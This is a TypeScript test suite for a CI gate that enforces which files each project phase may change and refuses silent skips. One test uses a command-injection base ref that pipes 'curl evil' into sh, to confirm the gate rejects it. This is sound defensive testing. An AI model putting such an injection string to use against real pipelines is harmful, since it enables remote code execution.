/**
 * Mutation tests for the phase changed-file ownership gate.
 *
 * The expensive failure this prevents is not a broken build. It is a Backend or
 * Database change riding inside a Frontend phase: reviewed as Frontend, gated
 * by no Backend job, and invisible until it breaks something in production.
 *
 * The second half of this file — from "a pull-request context resolves a
 * profile" onwards — is about the OTHER way a gate stops working: not a wrong
 * verdict, but no verdict at all, reported as success. See
 * `decideOwnershipRun()`.
 */
import { readFileSync, readdirSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import {
  DEFAULT_BASE,
  PROFILE_MAP_PATH,
  PROFILES,
  PROTECTED_BRANCHES,
  PULL_REQUEST_EVENTS,
  classify,
  decideOwnershipRun,
  envFileBody,
  evaluate,
  shellQuote,
} from '../../scripts/ci/check-phase-ownership.mjs';

const REPO_ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const WORKFLOWS = join(REPO_ROOT, '.github', 'workflows');
const NODE_QUALITY = join(WORKFLOWS, '_reusable-node-quality.yml');

/**
 * True when a workflow's top-level `on:` block names `pull_request`.
 *
 * Scanned line by line rather than matched with a regex. The regex form of this
 * — `/^on:\s*$\n(?:\s+.*$\n)*?\s{2}pull_request:/m` — backtracks
 * catastrophically on the files where it does NOT match, because `\s+` and `.*`
 * can divide the same line between them in exponentially many ways. It hung the
 * suite rather than failing it, which is the one outcome worse than red.
 */
function firesOnPullRequest(source: string): boolean {
  const lines = source.split(/\r?\n/);
  const start = lines.findIndex((l) => /^on:\s*$/.test(l));
  if (start === -1) return false;
  for (let i = start + 1; i < lines.length; i += 1) {
    const line = lines[i] ?? '';
    if (line.trim() === '' || line.startsWith('#')) continue;
    // The block ends at the first line that is not indented.
    if (!/^\s/.test(line)) return false;
    if (/^ {2}pull_request:/.test(line)) return true;
  }
  return false;
}

/** The real committed branch → profile map, so the cases are about real rules. */
const RULES = JSON.parse(readFileSync(join(REPO_ROOT, PROFILE_MAP_PATH), 'utf8')).rules as {
  branchPrefix: string;
  profile: string;
}[];

describe('classify', () => {
  it('places each path in the bucket that owns it', () => {
    expect(classify('apps/web/src/features/authentication/login/LoginForm.tsx')).toBe('web');
    expect(classify('apps/api/src/app/api/v1/users/route.ts')).toBe('apiSource');
    expect(classify('apps/api/package.json')).toBe('apiConfig');
    expect(classify('supabase/migrations/0120_new.sql')).toBe('migrations');
    expect(classify('supabase/config.toml')).toBe('supabase');
    expect(classify('docs/phase-1/phase-1-26/task-register.md')).toBe('docs');
    expect(classify('scripts/ci/check-api-backend-only.mjs')).toBe('tooling');
    expect(classify('.github/workflows/pr-ci.yml')).toBe('tooling');
    expect(classify('tests/ci/phase-ownership.test.ts')).toBe('tests');
    expect(classify('package.json')).toBe('rootConfig');
    expect(classify('Dockerfile')).toBe('rootConfig');
  });

  it('classifies a migration as a migration, never merely as supabase', () => {
    // Order matters: the specific rule must win, or a new migration would be
    // permitted anywhere `supabase` is permitted.
    expect(classify('supabase/migrations/0001_extensions.sql')).toBe('migrations');
  });
});

describe('p1-26-frontend profile', () => {
  const FRONTEND_CHANGES = [
    'apps/web/src/features/authentication/login/LoginForm.tsx',
    'apps/web/tests/login.dom.test.tsx',
    'docs/phase-1/phase-1-26/task-register.md',
    'scripts/ci/check-phase-ownership.mjs',
    'tests/ci/phase-ownership.test.ts',
    'package.json',
  ];

  it('permits a Frontend phase to change web, docs, tooling, tests and root config', () => {
    const { failures, counts } = evaluate(FRONTEND_CHANGES, 'p1-26-frontend');
    expect(failures).toEqual([]);
    expect(counts.web).toBeGreaterThan(0);
    expect(counts.changed).toBe(FRONTEND_CHANGES.length);
  });

  it.each([
    ['API source', 'apps/api/src/modules/iam/application/user-service.ts', 'apiSource'],
    ['API config', 'apps/api/next.config.ts', 'apiConfig'],
    ['a migration', 'supabase/migrations/0120_p1_26.sql', 'migrations'],
    ['the database', 'supabase/config.toml', 'supabase'],
  ])('fails when a Frontend phase changes %s', (_label, path, bucket) => {
    const { failures } = evaluate([...FRONTEND_CHANGES, path], 'p1-26-frontend');
    expect(failures.some((f) => f.startsWith(`${bucket}:`) && f.includes(path))).toBe(true);
  });

  it('names the Backend remediation as the route for an API change', () => {
    // The gate must not merely refuse — a refusal with no route is where a
    // Backend change gets smuggled in instead of being separated.
    const { failures } = evaluate(
      [...FRONTEND_CHANGES, 'apps/api/src/modules/iam/application/authentication-service.ts'],
      'p1-26-frontend'
    );
    expect(failures.some((f) => f.includes('Backend remediation'))).toBe(true);
  });

  it('fails on an unclassified file rather than shrugging', () => {
    const { failures } = evaluate([...FRONTEND_CHANGES, 'weird/place/thing.bin'], 'p1-26-frontend');
    expect(failures.some((f) => f.includes('unclassified changed file'))).toBe(true);
  });

  it('fails on an empty change set rather than passing vacuously', () => {
    // Every rule iterates the changed set, so an empty set judges nothing. That
    // is indistinguishable from a diff against the wrong base ref.
    const { failures } = evaluate([], 'p1-26-frontend');
    expect(failures.some((f) => f.includes('broken comparison'))).toBe(true);
  });

  it('rejects an unknown profile instead of defaulting to a permissive one', () => {
    const { failures } = evaluate(FRONTEND_CHANGES, 'no-such-profile');
    expect(failures.some((f) => f.includes('unknown ownership profile'))).toBe(true);
  });
});

describe('api-boundary profile', () => {
  it('permits the remediation to change API source and tooling', () => {
    const { failures } = evaluate(
      [
        'apps/api/src/app/api/health/route.ts',
        'apps/api/package.json',
        'scripts/ci/check-api-backend-only.mjs',
        'docs/phase-1/phase-1-26/preflight/findings.md',
      ],
      'api-boundary'
    );
    expect(failures).toEqual([]);
  });

  it('still forbids the remediation from touching migrations or the database', () => {
    const { failures } = evaluate(
      ['apps/api/package.json', 'supabase/migrations/0120_x.sql'],
      'api-boundary'
    );
    expect(failures.some((f) => f.includes('must not change a migration'))).toBe(true);
  });
});

describe('backend-login-contract profile', () => {
  const BACKEND_CHANGES = [
    'apps/api/src/modules/iam/application/authentication-service.ts',
    'apps/api/src/modules/iam/provider/supabase-provider.ts',
    'apps/api/src/app/api/v1/auth/login/route.ts',
    'tests/backend/iam-auth-provider.test.ts',
    'docs/phase-1/phase-1-26/login-identity-contract.md',
    'scripts/ci/check-phase-ownership.mjs',
  ];

  it('permits the login-contract remediation to change API source, tests and docs', () => {
    const { failures, counts } = evaluate(BACKEND_CHANGES, 'backend-login-contract');
    expect(failures).toEqual([]);
    expect(counts.apiSource).toBeGreaterThan(0);
  });

  it('forbids the Frontend half from riding along in the Backend change', () => {
    // The point of a separate profile. A Backend profile that also permitted
    // `web` would let both halves of a contract change land in one commit that
    // neither the Frontend nor the Backend review would see whole — the same
    // hole `p1-26-frontend` closes, merely pointing the other way.
    const { failures } = evaluate(
      [...BACKEND_CHANGES, 'apps/web/src/features/authentication/login/LoginForm.tsx'],
      'backend-login-contract'
    );
    expect(failures.some((f) => f.startsWith('web:'))).toBe(true);
  });

  it.each([
    ['a migration', 'supabase/migrations/0121_login.sql', 'migrations'],
    ['the database', 'supabase/config.toml', 'supabase'],
  ])('still forbids %s', (_label, path, bucket) => {
    const { failures } = evaluate([...BACKEND_CHANGES, path], 'backend-login-contract');
    expect(failures.some((f) => f.startsWith(`${bucket}:`) && f.includes(path))).toBe(true);
  });
});

describe('p1-27-backend-partner-identity profile', () => {
  /*
   * This profile exists because seven API source files were riding inside the
   * P1-27 FRONTEND branch — reviewed by nobody as Backend and triggered by no
   * Backend gate, which is the exact failure `p1-26-frontend` was written to
   * stop and which it caught here.
   */
  const BACKEND_CHANGES = [
    'apps/api/src/modules/vehicle/application/partner-identity.ts',
    'apps/api/src/modules/crm/application/customer-read-service.ts',
    'apps/api/src/modules/crm/data/customer-read-repository.ts',
    'tests/backend/vehicle-partner-identity.test.ts',
    'docs/phase-1/phase-1-27/final-canonical-remediation.md',
    'scripts/ci/check-phase-ownership.mjs',
  ];

  it('permits the partner-identity remediation to change API source, tests and docs', () => {
    const { failures, counts } = evaluate(BACKEND_CHANGES, 'p1-27-backend-partner-identity');
    expect(failures).toEqual([]);
    expect(counts.apiSource).toBeGreaterThan(0);
  });

  it('forbids the Frontend half from riding along', () => {
    const { failures } = evaluate(
      [...BACKEND_CHANGES, 'apps/web/src/components/party/PartyLabel.tsx'],
      'p1-27-backend-partner-identity'
    );
    expect(failures.some((f) => f.startsWith('web:'))).toBe(true);
  });

  it.each([
    ['a migration', 'supabase/migrations/0121_identity.sql', 'migrations'],
    ['the database', 'supabase/config.toml', 'supabase'],
  ])('still forbids %s', (_label, path, bucket) => {
    const { failures } = evaluate([...BACKEND_CHANGES, path], 'p1-27-backend-partner-identity');
    expect(failures.some((f) => f.startsWith(`${bucket}:`) && f.includes(path))).toBe(true);
  });
});

describe('p1-27-frontend profile', () => {
  it('forbids API source under P1-27’s own name, not under P1-26’s', () => {
    /*
     * The gate defaults to `p1-26-frontend` when no profile argument is given,
     * so P1-27 was measured against ANOTHER phase's declaration for its entire
     * life. The rules are identical; the declaration is the point. A phase that
     * borrows a profile has not declared what it may change.
     */
    const { failures } = evaluate(
      ['apps/web/src/features/crm/customers/api.ts', 'apps/api/src/modules/crm/index.ts'],
      'p1-27-frontend'
    );
    expect(failures.some((f) => f.startsWith('apiSource:'))).toBe(true);
    for (const bucket of ['apiSource', 'apiConfig', 'migrations', 'supabase']) {
      expect(Object.keys(PROFILES['p1-27-frontend'].forbidden)).toContain(bucket);
    }
  });

  it('permits exactly what the P1-26 Frontend profile permits', () => {
    // Divergence between two Frontend profiles would be a governance difference
    // nobody decided on. If one is ever loosened, this says so.
    expect([...PROFILES['p1-27-frontend'].allowed].sort()).toEqual(
      [...PROFILES['p1-26-frontend'].allowed].sort()
    );
    expect(Object.keys(PROFILES['p1-27-frontend'].forbidden).sort()).toEqual(
      Object.keys(PROFILES['p1-26-frontend'].forbidden).sort()
    );
  });
});

describe('every profile is SELECTABLE, not merely declared', () => {
  it('is reachable by name from the command line or the environment', () => {
    /*
     * The gate's npm script passes no argument, so every invocation used the
     * `p1-26-frontend` default — which forbids `apiSource` and therefore cannot
     * pass on a Backend branch at all. The two P1-27 profiles were reachable
     * from no script and no workflow: a profile nothing can select is a
     * declaration, not a gate, and that is this phase's own recurring defect
     * appearing in its own tooling.
     *
     * Asserted by reading the script, because the selection happens in `main()`
     * which this file does not call.
     */
    const source = readFileSync(
      join(process.cwd(), 'scripts', 'ci', 'check-phase-ownership.mjs'),
      'utf8'
    );
    expect(source).toContain('process.env.PHASE_OWNERSHIP_PROFILE');
    expect(source).toContain('process.env.PHASE_OWNERSHIP_BASE');
    // And every declared profile must be a name `evaluate` accepts, or the
    // selection mechanism points at nothing.
    for (const name of Object.keys(PROFILES)) {
      const { failures } = evaluate(['apps/web/src/x.ts'], name);
      expect(
        failures.some((f) => f.includes('unknown ownership profile')),
        name
      ).toBe(false);
    }
  });
});

describe('profile declarations', () => {
  it('declares every profile with a reason and disjoint allow/forbid sets', () => {
    for (const [name, profile] of Object.entries(PROFILES)) {
      expect(profile.why, `${name} states why it exists`).toBeTruthy();
      for (const bucket of profile.allowed) {
        expect(Object.keys(profile.forbidden), `${name}: ${bucket}`).not.toContain(bucket);
      }
    }
  });

  it('forbids API source, supabase and migrations in the P1-26 Frontend profile', () => {
    // The three that matter for P1-26's governance statement.
    const forbidden = Object.keys(PROFILES['p1-26-frontend'].forbidden);
    expect(forbidden).toContain('apiSource');
    expect(forbidden).toContain('supabase');
    expect(forbidden).toContain('migrations');
  });
});

describe('a pull-request context resolves a profile and runs the gate', () => {
  it('resolves the head branch against the committed map', () => {
    const verdict = decideOwnershipRun({
      headBranch: 'p1-27/ci-gates',
      baseRef: 'develop',
      eventName: 'pull_request',
      refName: '42/merge',
      rules: RULES,
    });
    expect(verdict.action).toBe('check');
    expect(verdict.checked).toBe(true);
    expect(verdict.profile).toBe('p1-27-frontend');
    expect(verdict.base).toBe('origin/develop');
  });

  it('refuses a head branch no rule claims, rather than defaulting', () => {
    const verdict = decideOwnershipRun({
      headBranch: 'wildcat/whatever',
      baseRef: 'develop',
      eventName: 'pull_request',
      rules: RULES,
    });
    expect(verdict.action).toBe('refuse');
    expect(verdict.checked).toBe(false);
    expect(verdict.reason).toContain('declares no changed-file ownership profile');
  });

  it('refuses an EMPTY map instead of treating it as permissive', () => {
    // An empty `rules` array would otherwise take the same path as an unmapped
    // branch and blame the branch for a broken file.
    const verdict = decideOwnershipRun({
      headBranch: 'p1-27/ci-gates',
      baseRef: 'develop',
      eventName: 'pull_request',
      rules: [],
    });
    expect(verdict.action).toBe('refuse');
    expect(verdict.reason).toContain('declares no rules');
  });
});

describe('the absence of a pull request is never a silent success', () => {
  it.each(PULL_REQUEST_EVENTS)('REFUSES a %s run whose caller passed no refs', (event) => {
    /*
     * The case that makes the whole suite worth having. If a caller drops
     * `head-branch:`, the step must break — not fall through to the skip path
     * and disable the ownership gate for every pull request at once.
     */
    const verdict = decideOwnershipRun({ eventName: event, refName: '7/merge', rules: RULES });
    expect(verdict.action).toBe('refuse');
    expect(verdict.checked).toBe(false);
    expect(verdict.reason).toContain('would judge nothing and report success');
  });

  it('refuses half a context', () => {
    for (const half of [
      { headBranch: 'p1-27/ci-gates', baseRef: '' },
      { headBranch: '', baseRef: 'develop' },
    ]) {
      const verdict = decideOwnershipRun({
        ...half,
        eventName: 'push',
        refName: 'x',
        rules: RULES,
      });
      expect(verdict.action, JSON.stringify(half)).toBe('refuse');
      expect(verdict.reason).toContain('exactly one of the');
    }
  });

  it('refuses a run that cannot name its own event', () => {
    const verdict = decideOwnershipRun({ refName: 'develop', rules: RULES });
    expect(verdict.action).toBe('refuse');
    expect(verdict.reason).toContain('cannot establish its own context');
  });

  it('refuses a push that carries no ref name either', () => {
    const verdict = decideOwnershipRun({ eventName: 'push', rules: RULES });
    expect(verdict.action).toBe('refuse');
    expect(verdict.reason).toContain('no ref name');
  });

  it('refuses an unmapped branch push — the same answer a pull request gets', () => {
    const verdict = decideOwnershipRun({
      eventName: 'workflow_dispatch',
      refName: 'someones-scratch-branch',
      rules: RULES,
    });
    expect(verdict.action).toBe('refuse');
    expect(verdict.reason).toContain('declares no changed-file ownership profile');
  });
});

describe('a push on an ORDINARY branch resolves the profile from the pushed ref', () => {
  // This is the case that used to skip: `pr-ci.yml` also fires on
  // `workflow_dispatch`, where the pull-request fields are empty. There is no
  // pull request, but the profile map is keyed on the branch and the branch is
  // right there.
  it.each([['push'], ['workflow_dispatch']])('%s on a mapped branch runs the gate', (event) => {
    const verdict = decideOwnershipRun({
      eventName: event,
      refName: 'remediation/p1-27-partner-identity',
      rules: RULES,
    });
    expect(verdict.action).toBe('check');
    expect(verdict.checked).toBe(true);
    expect(verdict.profile).toBe('p1-27-backend-partner-identity');
    expect(verdict.base).toBe(DEFAULT_BASE);
  });
});

describe('a protected push is a DECLARED skip, not a pass', () => {
  it.each(PROTECTED_BRANCHES)('declares the skip on %s and reports checked: false', (branch) => {
    const verdict = decideOwnershipRun({ eventName: 'push', refName: branch, rules: RULES });
    expect(verdict.action).toBe('declared-skip');
    // The property the whole exercise is about: whatever else this run reports,
    // it does not report that ownership was checked.
    expect(verdict.checked).toBe(false);
    expect(verdict.profile).toBeNull();
    expect(verdict.reason).toContain('DECLARED SKIP');
    expect(verdict.reason).toContain('nothing was checked');
  });

  it('is the ONLY outcome that neither checks nor fails', () => {
    /*
     * Enumerated rather than asserted case by case: if a future edit adds a
     * quiet fourth way out, this fails. `checked === false && action !== refuse`
     * is exactly the shape of the defect, and exactly one situation is allowed
     * to have it.
     */
    const situations = [
      { eventName: 'pull_request', headBranch: 'p1-27/x', baseRef: 'develop' },
      { eventName: 'pull_request', refName: '9/merge' },
      { eventName: 'pull_request_target', refName: '9/merge' },
      { eventName: 'push', refName: 'p1-27/x' },
      { eventName: 'push', refName: 'develop' },
      { eventName: 'push', refName: 'main' },
      { eventName: 'push', refName: 'unmapped' },
      { eventName: 'push' },
      { eventName: 'workflow_dispatch', refName: 'develop' },
      { eventName: 'workflow_dispatch', refName: 'feature/p1-27-integration' },
      {},
    ];
    const quiet = situations
      .map((s) => ({ s, v: decideOwnershipRun({ ...s, rules: RULES }) }))
      .filter(({ v }) => v.checked === false && v.action !== 'refuse');
    expect(quiet.map(({ s }) => JSON.stringify(s))).toEqual([
      JSON.stringify({ eventName: 'push', refName: 'develop' }),
      JSON.stringify({ eventName: 'push', refName: 'main' }),
      JSON.stringify({ eventName: 'workflow_dispatch', refName: 'develop' }),
    ]);
    expect(quiet.every(({ v }) => v.action === 'declared-skip')).toBe(true);
  });
});

describe('every profile the map can select is one the ownership gate defines', () => {
  it('resolves to a defined profile for each committed rule', () => {
    expect(RULES.length).toBeGreaterThan(0);
    for (const rule of RULES) {
      const verdict = decideOwnershipRun({
        headBranch: `${rule.branchPrefix}sample`,
        baseRef: 'develop',
        eventName: 'pull_request',
        rules: RULES,
      });
      expect(verdict.action, rule.branchPrefix).toBe('check');
      expect(
        Object.keys(PROFILES),
        `${rule.branchPrefix} resolves to ${verdict.profile}, which check-phase-ownership.mjs does not define`
      ).toContain(verdict.profile);
    }
  });
});

describe('the values the run block sources cannot escape their quotes', () => {
  it('quotes a value containing a single quote', () => {
    expect(shellQuote("a'b")).toBe(`'a'\\''b'`);
  });

  it('emits three keys and nothing derived from a branch name', () => {
    const body = envFileBody(
      decideOwnershipRun({
        headBranch: 'p1-27/ci-gates',
        baseRef: 'develop',
        eventName: 'pull_request',
        rules: RULES,
      })
    );
    expect(body).toContain("OWNERSHIP_ACTION='check'");
    expect(body).toContain("OWNERSHIP_PROFILE='p1-27-frontend'");
    expect(body).toContain("OWNERSHIP_BASE='origin/develop'");
    expect(body).not.toContain('ci-gates');
  });

  it('refuses a base ref that is not a usable ref name', () => {
    // Both defences are live: the value never reaches `shellQuote` at all.
    const verdict = decideOwnershipRun({
      headBranch: 'p1-27/ci-gates',
      baseRef: "develop'; curl evil | sh; '",
      eventName: 'pull_request',
      rules: RULES,
    });
    expect(verdict.action).toBe('refuse');
    expect(verdict.reason).toContain('not a usable ref name');
  });
});

describe('the step is wired to the decision, and the callers are wired to the step', () => {
  const nodeQuality = readFileSync(NODE_QUALITY, 'utf8');
  /** The `Changed-file ownership` step body, indentation and all. */
  const step = (() => {
    const start = nodeQuality.indexOf('- name: Changed-file ownership');
    expect(start, 'the ownership step is gone from _reusable-node-quality.yml').toBeGreaterThan(0);
    const next = nodeQuality.indexOf('\n      - name:', start + 1);
    return nodeQuality.slice(start, next === -1 ? undefined : next);
  })();

  it('delegates the decision to the module rather than to a shell conditional', () => {
    expect(step).toContain('node scripts/ci/check-phase-ownership.mjs --resolve-context');
    expect(step).toContain('OWNERSHIP_EVENT_NAME: ${{ github.event_name }}');
    expect(step).toContain('OWNERSHIP_REF_NAME: ${{ github.ref_name }}');
  });

  it('contains no bare `exit 0` — the shape the defect had', () => {
    /*
     * Stated as a property of the text because that is where the defect lived:
     *
     *     if [ -z "${HEAD_BRANCH}" ] || [ -z "${BASE_REF}" ]; then … exit 0; fi
     *
     * A step that ends itself successfully before doing its work cannot be
     * distinguished from one that did the work, by anything downstream.
     */
    expect(step).not.toMatch(/^\s*exit 0\s*$/m);
  });

  it('runs the ownership gate only on the `check` verdict, and does run it', () => {
    expect(step).toMatch(/if \[ "\$\{OWNERSHIP_ACTION\}" = "check" \]/);
    expect(step).toContain('npm run validate:phase-ownership');
    expect(step).toContain('PHASE_OWNERSHIP_PROFILE="${OWNERSHIP_PROFILE}"');
    expect(step).toContain('PHASE_OWNERSHIP_BASE="${OWNERSHIP_BASE}"');
  });

  it('keeps the declared skip as retrievable evidence', () => {
    expect(step).toContain('--json phase-ownership-context.json');
    expect(nodeQuality).toContain('            phase-ownership-context.json\n');
  });

  it('every pull-request caller of static-quality passes both refs', () => {
    /*
     * The other half of the silent skip. `decideOwnershipRun()` now REFUSES a
     * `pull_request` run with no refs, so a caller that drops one breaks in CI
     * — but it breaks after the pull request is opened. This says so here.
     */
    const callers = readdirSync(WORKFLOWS).filter((f) => f.endsWith('.yml'));
    let checked = 0;
    for (const file of callers) {
      const source = readFileSync(join(WORKFLOWS, file), 'utf8');
      if (!source.includes('_reusable-node-quality.yml')) continue;
      if (!source.includes('task: static-quality')) continue;
      if (!firesOnPullRequest(source)) continue;
      const job = source.slice(source.indexOf('task: static-quality'));
      const body = job.slice(0, job.indexOf('\n\n') === -1 ? undefined : job.indexOf('\n\n'));
      expect(body, `${file} calls static-quality on a pull request without head-branch`).toContain(
        'head-branch:'
      );
      expect(body, `${file} calls static-quality on a pull request without base-ref`).toContain(
        'base-ref:'
      );
      checked += 1;
    }
    // Anti-vacuity: a loop that matched no workflow would pass having asserted
    // nothing, which is the failure mode this whole file is about.
    expect(checked, 'no pull-request caller of static-quality was found at all').toBeGreaterThan(0);
  });
});
